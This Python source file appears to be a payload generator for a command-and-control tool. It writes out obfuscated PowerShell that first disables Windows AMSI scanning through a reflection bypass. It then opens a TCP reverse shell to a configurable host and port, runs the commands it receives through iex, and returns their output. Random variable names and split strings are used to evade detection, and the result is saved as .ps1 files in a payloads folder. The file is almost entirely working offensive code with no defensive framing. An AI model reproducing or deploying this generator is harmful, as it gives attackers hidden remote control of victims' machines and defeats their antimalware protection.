
import random
import string
import os
from datetime import datetime

def rand_name(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def split_string(s):
    # Splits a string into a "+"-joined sequence of chars for obfuscation
    return '+'.join([f"'{c}'" for c in s])

def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
    # Randomized variable names
    var = {k: rand_name(random.randint(5, 10)) for k in [
        "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback", "sendback2", "sendbyte", "encoding"
    ]}

    # AMSI bypass with randomized names
    amsi_bypass = f"""${{var['amsi_type']}} = {split_string('AMSI')};
${{var['amsi_field']}} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}${{var['amsi_type']}}+{split_string('Utils')});
${{var['amsi_failed']}} = ${{var['amsi_field']}}.GetField(${{var['amsi_type']}}+{split_string('InitFailed')},'NonPublic,Static');
${{var['amsi_failed']}}.SetValue($null,$true);"""

    # Reverse shell payload with split and randomized names
    ps = f"""
{amsi_bypass}

${{var['tcpclient']}} = New-Object ({split_string('System.Net.Sockets.TCPClient')})('{host}', {port});
${{var['stream']}} = ${{var['tcpclient']}}.GetStream();
${{var['bytes']}} = 0..65535|%{{0}};
while((${{var['i']}} = ${{var['stream']}}.Read(${{var['bytes']}},0,${{var['bytes']}}.Length)) -ne 0){{
    ${{var['data']}} = (New-Object -TypeName ({split_string('System.Text.ASCIIEncoding')})).GetString(${{var['bytes']}},0,${{var['i']}});
    ${{var['sendback']}} = (iex ${{var['data']}} 2>&1 | Out-String );
    ${{var['sendback2']}} = ${{var['sendback']}} + "PS " + (pwd).Path + "> ";
    ${{var['sendbyte']}} = ([text.encoding]::ASCII).GetBytes(${{var['sendback2']}});
    ${{var['stream']}}.Write(${{var['sendbyte']}},0,${{var['sendbyte']}}.Length);
    ${{var['stream']}}.Flush();
}}
""".strip()

    if write_file:
        # Ensure payload directory exists
        folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
        os.makedirs(folder, exist_ok=True)
        filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
        path = os.path.join(folder, filename)
        with open(path, 'w') as f:
            f.write(ps)
        return filename
    else:
        return ps

# Legacy alias for route compatibility
generate_polymorphic_ps = generate_obfuscated_ps
